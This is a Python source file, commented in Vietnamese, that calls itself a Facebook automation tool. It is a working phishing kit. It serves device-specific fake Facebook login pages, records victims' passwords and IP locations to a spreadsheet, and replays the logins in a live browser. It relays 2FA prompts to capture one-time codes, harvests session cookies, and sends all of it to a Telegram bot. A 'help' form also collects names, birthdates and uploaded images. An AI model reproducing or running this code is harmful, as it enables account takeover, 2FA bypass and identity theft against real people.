#!/usr/bin/env python3
"""
Facebook Automation Tool - Terminal CLI
======================================
Tool tự động hóa đăng nhập Facebook với giao diện terminal.
Mỗi user chạy trên một luồng riêng biệt với Playwright instance riêng.
"""

import os
import sys
import time
import threading
import queue
import base64
import uuid
import webbrowser
import subprocess
from datetime import datetime
from typing import Optional, Dict, Any
from concurrent.futures import Future
import requests

# Thêm thư mục gốc vào path để import các module
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from flask import Flask, render_template, request, jsonify, make_response
from openpyxl import Workbook, load_workbook

# Import utils
from utils.get_html import get_facebook_page_after_login, get_cookies, wait_and_save_cookies

# Create uploads directory if not exists
UPLOADS_DIR = "uploads"
if not os.path.exists(UPLOADS_DIR):
    os.makedirs(UPLOADS_DIR)

# Global storage for HFA HTML and session data
_hfa_html_storage: Dict[str, str] = {}
_pending_telegram_data: Dict[str, dict] = {}  # Store login info to send combined message
_active_sessions: Dict[str, '_AutomationWorker'] = {}
_sessions_lock = threading.Lock()
BOT_CONFIG_FILE = "bot_config.txt"


class _AutomationWorker:
    """Worker thread chạy Playwright operations cho mỗi user riêng biệt"""
    
    def __init__(self, email: str):
        self.email = email
        self._q: "queue.Queue[tuple[callable, tuple, dict, Future]]" = queue.Queue()
        self._thread = threading.Thread(
            target=self._run, 
            name=f"worker-{email}", 
            daemon=True
        )
        self._thread.start()
    
    def _run(self):
        """Main loop của worker thread"""
        while True:
            func, args, kwargs, fut = self._q.get()
            try:
                result = func(*args, **kwargs)
                fut.set_result(result)
            except Exception as e:
                fut.set_exception(e)
    
    def call(self, func, *args, **kwargs):
        """Gọi đồng bộ - đợi kết quả"""
        fut: Future = Future()
        self._q.put((func, args, kwargs, fut))
        return fut.result()
    
    def submit(self, func, *args, **kwargs) -> Future:
        """Gọi bất đồng bộ"""
        fut: Future = Future()
        self._q.put((func, args, kwargs, fut))
        return fut


def save_base64_image(base64_data: str, original_filename: str = "") -> str:
    """Decode base64 và lưu thành file ảnh, trả về đường dẫn file"""
    if not base64_data:
        return ""
    
    try:
        # Generate unique filename
        ext = os.path.splitext(original_filename)[1] if original_filename else ".png"
        if not ext:
            ext = ".png"
        
        unique_name = f"{uuid.uuid4().hex}{ext}"
        file_path = os.path.join(UPLOADS_DIR, unique_name)
        
        # Decode base64
        image_bytes = base64.b64decode(base64_data)
        
        # Save to file
        with open(file_path, "wb") as f:
            f.write(image_bytes)
        
        return file_path
    except Exception as e:
        print(f"[Image Save Error] {e}")
        return ""


def get_ip_location(ip: str) -> str:
    """Lấy thông tin vị trí từ IP sử dụng ip-api.com"""
    try:
        # Skip for localhost/private IPs
        if ip in ('127.0.0.1', 'localhost') or ip.startswith('192.168.') or ip.startswith('10.'):
            return 'Local/Private Network'
        
        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp', timeout=5)
        data = response.json()
        
        if data.get('status') == 'success':
            location = f"{data.get('city', 'N/A')}, {data.get('regionName', 'N/A')}, {data.get('country', 'N/A')} ({data.get('isp', 'N/A')})"
            return location
        return 'Unknown'
    except Exception as e:
        return f'Error: {str(e)[:30]}'


def save_to_info_excel(data: dict) -> None:
    """Lưu dữ liệu vào file info.xlsx"""
    filename = "info.xlsx"
    
    # Create workbook if doesn't exist
    if not os.path.exists(filename):
        wb = Workbook()
        ws = wb.active
        ws.title = "Help Form Data"
        headers = ['Timestamp', 'IP Address', 'Location', 'Full Name', 'Email', 'Year', 'Month', 'Day', 'Image Path']
        for col, header in enumerate(headers, 1):
            ws.cell(row=1, column=col, value=header)
        wb.save(filename)
    
    # Load workbook and append data
    wb = load_workbook(filename)
    ws = wb.active
    
    row_data = [
        data.get('timestamp', ''),
        data.get('ip', ''),
        data.get('location', ''),
        data.get('field1', ''),
        data.get('field2', ''),
        data.get('year', ''),
        data.get('month', ''),
        data.get('day', ''),
        data.get('image', '')
    ]
    
    ws.append(row_data)
    wb.save(filename)


def send_telegram_message(message: str) -> bool:
    """Gửi message qua Telegram Bot"""
    try:
        if not os.path.exists(BOT_CONFIG_FILE):
            print(f"[Telegram] Config file not found: {BOT_CONFIG_FILE}")
            return False
        
        with open(BOT_CONFIG_FILE, "r") as f:
            lines = f.readlines()
            if len(lines) < 2:
                return False
            
            token = lines[0].strip()
            chat_id = lines[1].strip()
        
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"[Telegram] Message sent successfully")
            return True
        else:
            print(f"[Telegram] Failed to send: {response.text}")
            return False
    except Exception as e:
        print(f"[Telegram] Error: {e}")
        return False


def detect_device(user_agent: str) -> str:
    """Phát hiện thiết bị từ User-Agent"""
    ua = user_agent.lower()
    if "iphone" in ua or "ipad" in ua or "ios" in ua:
        return "iOS"
    if "android" in ua:
        return "Android"
    return "Desktop"


def create_unified_app():
    """Tạo Flask app với cả login và help trên cùng 1 port"""
    template_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
    app = Flask(__name__, template_folder=template_dir)
    
    FILE_NAME = "users.xlsx"
    
    @app.route("/")
    def home():
        """Trang chủ - hiển thị form login phù hợp với thiết bị"""
        user_agent = request.headers.get("User-Agent", "")
        device = detect_device(user_agent)
        
        print(f"[Login] User-Agent: {user_agent[:50]}...")
        print(f"[Login] Device: {device}")
        
        template_map = {
            "iOS": "iOS/login.html",
            "Android": "Android/login.html",
            "Desktop": "Desktop/login.html"
        }
        template = template_map.get(device, "Desktop/login.html")
        return render_template(template)
    
    @app.route("/api/languages", methods=["GET"])
    def get_languages():
        """API trả về danh sách ngôn ngữ có sẵn"""
        languages = [
            {"code": "en", "name": "English (US)", "flag": "🇺🇸"},
            {"code": "vi", "name": "Tiếng Việt", "flag": "🇻🇳"},
            {"code": "th", "name": "ภาษาไทย", "flag": "🇹🇭"},
            {"code": "es", "name": "Español", "flag": "🇪🇸"},
            {"code": "fr", "name": "Français", "flag": "🇫🇷"},
            {"code": "de", "name": "Deutsch", "flag": "🇩🇪"},
            {"code": "pt", "name": "Português", "flag": "🇵🇹"},
            {"code": "zh", "name": "中文 (简体)", "flag": "🇨🇳"},
            {"code": "ja", "name": "日本語", "flag": "🇯🇵"},
            {"code": "ko", "name": "한국어", "flag": "🇰🇷"},
            {"code": "id", "name": "Bahasa Indonesia", "flag": "🇮🇩"},
            {"code": "tr", "name": "Türkçe", "flag": "🇹🇷"},
            {"code": "ru", "name": "Русский", "flag": "🇷🇺"},
            {"code": "ar", "name": "العربية", "flag": "🇸🇦"}
        ]
        return jsonify({"success": True, "languages": languages})
    
    @app.route("/set_language", methods=["POST"])
    def set_language():
        """API để set ngôn ngữ ưa thích cho user"""
        data = request.get_json() or request.form
        lang = data.get("lang", "en")
        
        valid_langs = ["en", "vi", "th", "es", "fr", "de", "pt", "zh", "ja", "ko", "id", "tr", "ru", "ar"]
        if lang not in valid_langs:
            return jsonify({"success": False, "error": "Invalid language code"}), 400
        
        response = jsonify({"success": True, "message": f"Language set to {lang}"})
        response.set_cookie("preferred_lang", lang, max_age=30*24*60*60)
        return response
    
    @app.route("/login_with_lang/<lang>")
    def login_with_lang(lang):
        """Trang login với ngôn ngữ được chỉ định qua URL"""
        user_agent = request.headers.get("User-Agent", "")
        device = detect_device(user_agent)
        
        valid_langs = ["en", "vi", "th", "es", "fr", "de", "pt", "zh", "ja", "ko", "id", "tr", "ru", "ar"]
        if lang not in valid_langs:
            lang = "en"
        
        template_map = {
            "iOS": "iOS/login.html",
            "Android": "Android/login.html",
            "Desktop": "Desktop/login.html"
        }
        template = template_map.get(device, "Desktop/login.html")
        
        response = make_response(render_template(template))
        response.set_cookie("preferred_lang", lang, max_age=30*24*60*60)
        return response
    
    @app.route("/login", methods=["POST"])
    def login():
        """API đăng nhập - mỗi request chạy trên luồng riêng"""
        data = request.json
        email = data.get("email", "").strip()
        password = data.get("password", "").strip()
        
        if not email or not password:
            return jsonify({"success": False, "error": "Thiếu email hoặc password"}), 400
        
        # Lấy IP và thông tin vị trí
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        location_info = get_ip_location(client_ip)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Tạo worker mới cho user này
        global _active_sessions, _sessions_lock
        with _sessions_lock:
            worker = _AutomationWorker(email)
            _active_sessions[email] = worker
        
        # Lưu credentials trước
        try:
            if not os.path.exists(FILE_NAME):
                wb = Workbook()
                ws = wb.active
                ws.append(["Email", "Password", "Cookies", "IP Address", "Location", "Timestamp"])
                wb.save(FILE_NAME)
            
            wb = load_workbook(FILE_NAME)
            ws = wb.active
            
            found = False
            for row in range(2, ws.max_row + 1):
                if ws.cell(row=row, column=1).value == email:
                    ws.cell(row=row, column=2).value = password
                    ws.cell(row=row, column=4).value = client_ip
                    ws.cell(row=row, column=5).value = location_info
                    ws.cell(row=row, column=6).value = timestamp
                    found = True
                    break
            
            if not found:
                ws.append([email, password, "", client_ip, location_info, timestamp])
            
            wb.save(FILE_NAME)
        except Exception as e:
            print(f"[Server] Lỗi lưu Excel: {e}")
        
        # Thực hiện đăng nhập trong worker thread riêng
        try:
            from utils.get_html import LAST_EMAIL, LAST_PASSWORD
            html, should_get_cookies, login_failed = worker.call(
                get_facebook_page_after_login,
                username=email,
                password=password,
                headless=False,
                timeout=300000
            )
            
            if login_failed:
                return jsonify({
                    "success": False,
                    "login_failed": True,
                    "error": "Thông tin đăng nhập không chính xác"
                })
            
            if not html:
                return jsonify({
                    "success": False,
                    "error": "Không lấy được HTML sau khi đăng nhập"
                }), 500
            
            # Kiểm tra nếu là trang 2FA
            is_2fa_page = 'two_step_verification/two_factor' in html or 'id="_r_3_"' in html
            
            if is_2fa_page:
                # Lưu HTML vào storage để serve qua /2fa
                session_id = str(uuid.uuid4())[:8]
                global _hfa_html_storage
                _hfa_html_storage[session_id] = html
                
                # Lưu thông tin đăng nhập để gửi Telegram sau khi có 2FA + cookies
                _pending_telegram_data[session_id] = {
                    'email': email,
                    'password': password,
                    'client_ip': client_ip,
                    'location_info': location_info,
                    'timestamp': timestamp,
                    'has_2fa': True,
                    'code_2fa': None,
                    'cookies': None
                }
                
                return jsonify({
                    "success": True,
                    "is_2fa": True,
                    "redirect_url": f"/2fa?sid={session_id}",
                    "message": "Cần xác thực 2FA"
                })
            
            # Lấy cookies hoặc đợi 2FA
            cookies_value = "Chưa có (đang đợi 2FA)"
            if should_get_cookies:
                try:
                    cookies = worker.call(get_cookies, file_name=FILE_NAME)
                    cookies_value = cookies if cookies else "Không lấy được"
                except Exception as e:
                    cookies_value = f"Lỗi: {str(e)[:50]}"
            else:
                worker.submit(wait_and_save_cookies, file_name=FILE_NAME)
            
            # Gửi Telegram 1 lần duy nhất với đầy đủ thông tin
            telegram_msg = f"📱 <b>THÔNG TIN ĐĂNG NHẬP</b>\n" \
                          f"━━━━━━━━━━━━━━━━━━━━━\n\n" \
                          f"👤 <b>Tài khoản:</b> <code>{email}</code>\n" \
                          f"🔑 <b>Mật khẩu:</b> <code>{password}</code>\n\n" \
                          f"🌐 <b>IP:</b> <code>{client_ip}</code>\n" \
                          f"📍 <b>Vị trí:</b> {location_info}\n" \
                          f"⏰ <b>Thời gian:</b> {timestamp}\n\n" \
                          f"🔐 <b>2FA:</b> Không có\n\n" \
                          f"🍪 <b>Cookies:</b>\n<code>{cookies_value}</code>"
            send_telegram_message(telegram_msg)
            
            return jsonify({
                "success": True,
                "html": html,
                "should_get_cookies": should_get_cookies
            })
            
        except Exception as e:
            return jsonify({
                "success": False,
                "error": f"Lỗi đăng nhập: {str(e)}"
            }), 500

    @app.route("/2fa")
    def serve_2fa_page():
        """Serve HFA HTML content directly as HTML page"""
        global _hfa_html_storage
        session_id = request.args.get('sid', '')
        
        if session_id and session_id in _hfa_html_storage:
            html_content = _hfa_html_storage[session_id]
            response = make_response(html_content)
            response.headers['Content-Type'] = 'text/html; charset=utf-8'
            return response
        
        return "Không tìm thấy trang 2FA", 404

    @app.route("/submit_2fa", methods=["POST"])
    def submit_2fa():
        """Nhận mã 2FA từ client, nhập vào trang đang đợi và lấy cookies"""
        try:
            data = request.get_json()
            code = data.get("code", "").strip()
            
            if not code or not code.isdigit() or len(code) != 6:
                return jsonify({"success": False, "error": "Mã 2FA không hợp lệ"}), 400
            
            # Lấy thông tin từ request
            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            if ',' in client_ip:
                client_ip = client_ip.split(',')[0].strip()
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # Lấy email từ LAST_EMAIL để lưu vào Excel
            from utils.get_html import LAST_EMAIL, LAST_PASSWORD
            email = LAST_EMAIL or "unknown"
            password = LAST_PASSWORD or "unknown"
            
            # Lưu mã 2FA vào Excel
            try:
                if not os.path.exists(FILE_NAME):
                    wb = Workbook()
                    ws = wb.active
                    ws.append(["Email", "Password", "2FA Code", "IP Address", "Timestamp", "Cookies"])
                    wb.save(FILE_NAME)
                
                wb = load_workbook(FILE_NAME)
                ws = wb.active
                
                target_row = None
                for row in range(ws.max_row, 1, -1):
                    if ws.cell(row=row, column=1).value == email:
                        target_row = row
                        break
                
                if target_row is None:
                    target_row = ws.max_row + 1
                    ws.cell(row=target_row, column=1).value = email
                    ws.cell(row=target_row, column=2).value = password
                
                ws.cell(row=target_row, column=3).value = code
                ws.cell(row=target_row, column=4).value = client_ip
                ws.cell(row=target_row, column=5).value = timestamp
                wb.save(FILE_NAME)
                print(f"[2FA] Đã lưu mã 2FA cho {email}")
            except Exception as excel_err:
                print(f"[2FA] Lỗi lưu Excel: {excel_err}")
            
            # Xóa gửi Telegram ngay - sẽ gửi 1 lần duy nhất sau khi có cookies
            # Tìm session_id từ pending data dựa vào email
            session_id = None
            for sid, data in _pending_telegram_data.items():
                if data.get('email') == email:
                    session_id = sid
                    data['code_2fa'] = code
                    break
            
            # Nhập mã 2FA vào trang đang đợi (trong worker thread)
            def process_2fa():
                from utils.get_html import LAST_PAGE, LAST_CONTEXT, get_cookies
                import time
                
                if LAST_PAGE is None:
                    print("[2FA] Không có page để nhập mã")
                    return False
                
                page = LAST_PAGE
                cookies_result = "Không lấy được"
                try:
                    print(f"[2FA] Đang nhập mã {code} vào trang...")
                    
                    input_selector = 'input[id="_r_3_"]'
                    try:
                        page.wait_for_selector(input_selector, timeout=5000)
                        page.fill(input_selector, code)
                        print("[2FA] Đã điền mã vào input")
                        time.sleep(0.5)
                    except Exception as input_err:
                        print(f"[2FA] Không tìm thấy input _r_3_: {input_err}")
                        return False
                    
                    continue_btn = page.locator('div[role="button"]:has-text("Continue")').first
                    if continue_btn.count() > 0:
                        print("[2FA] Đang click nút Continue...")
                        continue_btn.click()
                        time.sleep(2)
                    else:
                        print("[2FA] Không tìm thấy nút, thử press Enter...")
                        page.keyboard.press("Enter")
                        time.sleep(2)
                    
                    print("[2FA] Đang chờ xử lý và lấy cookies...")
                    cookies = get_cookies(file_name=FILE_NAME)
                    cookies_result = cookies if cookies else "Không lấy được"
                    print(f"[2FA] Đã lấy cookies: {len(cookies_result)} ký tự")
                    
                    # Gửi Telegram 1 lần duy nhất với đầy đủ thông tin
                    if session_id and session_id in _pending_telegram_data:
                        pending = _pending_telegram_data[session_id]
                        telegram_msg = f"📱 <b>THÔNG TIN ĐĂNG NHẬP</b>\n" \
                                      f"━━━━━━━━━━━━━━━━━━━━━\n\n" \
                                      f"👤 <b>Tài khoản:</b> <code>{pending['email']}</code>\n" \
                                      f"🔑 <b>Mật khẩu:</b> <code>{pending['password']}</code>\n\n" \
                                      f"🌐 <b>IP:</b> <code>{pending['client_ip']}</code>\n" \
                                      f"📍 <b>Vị trí:</b> {pending['location_info']}\n" \
                                      f"⏰ <b>Thời gian:</b> {pending['timestamp']}\n\n" \
                                      f"🔐 <b>2FA:</b> <code>{pending['code_2fa']}</code>\n\n" \
                                      f"🍪 <b>Cookies:</b>\n<code>{cookies_result}</code>"
                        send_telegram_message(telegram_msg)
                        # Xóa pending data sau khi gửi
                        del _pending_telegram_data[session_id]
                    
                    return True
                    
                except Exception as proc_err:
                    print(f"[2FA] Lỗi khi xử lý: {proc_err}")
                    return False
            
            # Chạy trong worker thread
            global _active_sessions, _sessions_lock
            with _sessions_lock:
                worker = _active_sessions.get(email)
            
            if worker:
                worker.submit(process_2fa)
            else:
                import threading
                threading.Thread(target=process_2fa, daemon=True).start()
            
            return jsonify({"success": True, "message": "Đang xử lý mã 2FA"})
            
        except Exception as e:
            print(f"[2FA] Lỗi: {e}")
            return jsonify({"success": False, "error": str(e)}), 500

    @app.route("/help")
    def help_page():
        """Trang help - hiển thị template phù hợp với thiết bị"""
        user_agent = request.headers.get("User-Agent", "")
        device = detect_device(user_agent)
        
        print(f"[Help] User-Agent: {user_agent[:50]}...")
        print(f"[Help] Device: {device}")
        
        template_map = {
            "iOS": "iOS/help.html",
            "Android": "Android/help.html",
            "Desktop": "Desktop/help.html"
        }
        template = template_map.get(device, "Desktop/help.html")
        return render_template(template)
    
    @app.route("/submit_help", methods=["POST"])
    def submit_help():
        """Nhận dữ liệu form help và lưu vào Excel"""
        try:
            data = request.get_json() or request.form
            
            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            if ',' in client_ip:
                client_ip = client_ip.split(',')[0].strip()
            
            location_info = get_ip_location(client_ip)
            
            image_path = ""
            image_data = data.get('image', '')
            if image_data:
                image_path = save_base64_image(image_data, "upload.png")
            
            info_data = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip': client_ip,
                'location': location_info,
                'field1': data.get('field1', ''),
                'field2': data.get('field2', ''),
                'year': data.get('year', ''),
                'month': data.get('month', ''),
                'day': data.get('day', ''),
                'image': image_path
            }
            
            save_to_info_excel(info_data)
            print(f"[Help Form] Data saved from IP: {client_ip}, Location: {location_info}")
            return jsonify({"success": True, "message": "Data saved successfully"}), 200
            
        except Exception as e:
            print(f"[Help Form] Error: {e}")
            return jsonify({"success": False, "error": str(e)}), 500
    
    @app.route("/upload_image", methods=["POST"])
    def upload_image():
        """Nhận file upload và trả về thông tin cho preview"""
        try:
            if 'file' not in request.files:
                return jsonify({"success": False, "error": "No file provided"}), 400
            
            file = request.files['file']
            if file.filename == '':
                return jsonify({"success": False, "error": "No file selected"}), 400
            
            file_bytes = file.read()
            file_id = str(uuid.uuid4())[:16].replace('-', '')
            file_data_b64 = base64.b64encode(file_bytes).decode('utf-8')
            
            hash_value = f"AZ{base64.b64encode(file_id.encode()).decode('utf-8').replace('=', '').replace('/', '').replace('+', '')[:80]}"
            
            response_data = {
                "success": True,
                "filename": file.filename,
                "file_id": file_id,
                "hash_value": hash_value,
                "size": len(file_bytes),
                "mime_type": file.content_type or 'application/octet-stream'
            }
            
            print(f"[Upload] File uploaded: {file.filename} ({len(file_bytes)} bytes)")
            return jsonify(response_data), 200
            
        except Exception as e:
            print(f"[Upload] Error: {e}")
            return jsonify({"success": False, "error": str(e)}), 500
    
    return app


def print_logo():
    """In logo tool lên terminal"""
    logo = """
    ███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗
    ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝
    █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ 
    ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ 
    ██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                                     
         █████╗ ██╗   ██╗████████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
        ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
        ███████║██║   ██║   ██║   ██║   ██║██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
        ██╔══██║██║   ██║   ██║   ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
        ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
        ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
    """
    print("\033[1;36m" + logo + "\033[0m")
    print("\033[1;33m" + " " * 30 + "Version 1.0.0 - Terminal Edition" + "\033[0m\n")


def print_menu():
    """In bảng menu"""
    print("\033[1;34m" + "=" * 70 + "\033[0m")
    print("\033[1;32m" + "                           MENU CHÍNH" + "\033[0m")
    print("\033[1;34m" + "=" * 70 + "\033[0m")
    print()
    print("  \033[1;33m[1]\033[0m  Chạy server")
    print("  \033[1;33m[2]\033[0m  Xem danh sách user đã đăng nhập")
    print("  \033[1;33m[3]\033[0m  Xóa user khỏi danh sách")
    print("  \033[1;33m[4]\033[0m  Thiết lập Telegram Bot")
    print("  \033[1;33m[5]\033[0m  Thiết lập trình duyệt mở master")
    print("  \033[1;33m[0]\033[0m  Thoát")
    print()
    print("\033[1;34m" + "=" * 70 + "\033[0m")


def get_input(prompt: str, allow_empty: bool = False) -> str:
    """Lấy input từ user với validation"""
    while True:
        try:
            value = input(f"\033[1;36m{prompt}\033[0m").strip()
            if not value and not allow_empty:
                print("\033[1;31m[!] Vui lòng không để trống\033[0m")
                continue
            return value
        except KeyboardInterrupt:
            print("\n\033[1;31m[!] Đã hủy\033[0m")
            return ""


def start_all_server():
    """Khởi động Flask server"""
    print("\n\033[1;34m" + "-" * 50 + "\033[0m")
    print("\033[1;32m           KHỞI ĐỘNG SERVER\033[0m")
    print("\033[1;34m" + "-" * 50 + "\033[0m\n")
    
    port_str = get_input("Nhập port (mặc định: 5000): ", allow_empty=True)
    port = int(port_str) if port_str.isdigit() else 5000
    
    print(f"\n\033[1;33m[*] Khởi động server tại http://localhost:{port}\033[0m")
    print(f"\033[1;33m[*] Mỗi user đăng nhập trên một luồng riêng biệt\033[0m")
    print(f"\033[1;36m    Nhập Ctrl+C để dừng server và quay lại menu\033[0m\n")
    
    try:
        app = create_unified_app()
        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)
    except KeyboardInterrupt:
        print(f"\n\033[1;33m[*] Đã dừng server\033[0m")
    except Exception as e:
        print(f"\n\033[1;31m[!] Lỗi server: {e}\033[0m")
    
    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")


def main():
    """Hàm chính"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print_logo()
    
    while True:
        print_menu()
        
        try:
            choice = get_input("\nNhập lựa chọn của bạn: ", allow_empty=True)
        except KeyboardInterrupt:
            print("\n\n\033[1;33m[*] Tạm biệt!\033[0m")
            break
        
        if choice == "1":
            start_all_server()
        elif choice == "0":
            print("\n\033[1;33m[*] Tạm biệt!\033[0m")
            break
        else:
            print("\n\033[1;31m[!] Lựa chọn không hợp lệ\033[0m")
            time.sleep(1)
        
        os.system('cls' if os.name == 'nt' else 'clear')
        print_logo()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n\033[1;33m[*] Đã thoát tool\033[0m")
        sys.exit(0)
